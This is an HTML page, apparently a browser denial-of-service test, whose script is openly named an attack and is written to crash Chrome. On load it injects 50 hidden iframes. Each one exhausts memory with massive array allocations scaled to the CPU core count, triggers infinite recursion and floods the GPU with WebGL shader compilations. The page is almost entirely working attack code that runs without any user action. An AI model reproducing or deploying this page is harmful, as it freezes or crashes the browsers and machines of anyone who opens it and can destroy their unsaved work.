<!DOCTYPE html>
<html>
<head>
    <title>Full Chrome Crash - Unrecoverable Overload</title>
</head>
<body>
    <h1>Final Chrome Crash Test</h1>
    <p>Chrome should become completely unresponsive.</p>

    <script>
        function createIframe() {
            let iframe = document.createElement("iframe");
            iframe.style.display = "none"; 
            iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
                <script>
                    function startWorker() {
                        let data = [];
                        function allocate() {
                            for (let i = 0; i < 200; i++) { 
                                data.push(new Float64Array(2e7)); // Even larger allocations
                            }
                            setTimeout(allocate, 25); // Faster execution
                        }
                        allocate();
                    }

                    function infiniteRecursion() {
                        try { return infiniteRecursion(); } catch (e) { infiniteRecursion(); }
                    }

                    function overloadGPU() {
                        let canvas = document.createElement('canvas');
                        let gl = canvas.getContext('webgl');
                        function floodGPU() {
                            let shaders = [];
                            setInterval(() => {
                                var shader = gl.createShader(gl.VERTEX_SHADER);
                                gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
                                gl.compileShader(shader);
                                shaders.push(shader);
                                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
                            }, 1);
                        }
                        floodGPU();
                    }

                    let coreMultiplier = navigator.hardwareConcurrency * 10; 
                    for (let i = 0; i < coreMultiplier; i++) {
                        setTimeout(startWorker, i * 10); 
                    }

                    setTimeout(() => infiniteRecursion(), 1000); // Introduce recursion early
                    setTimeout(() => overloadGPU(), 1000); // Start GPU flood
                <\/script>
            `);
            document.body.appendChild(iframe);
        }

        function launchAttack() {
            for (let i = 0; i < 50; i++) { // Increase iframe count
                setTimeout(createIframe, i * 10); // Inject iframes more aggressively
            }
        }

        launchAttack(); // Start attack immediately
    </script>
</body>
</html>

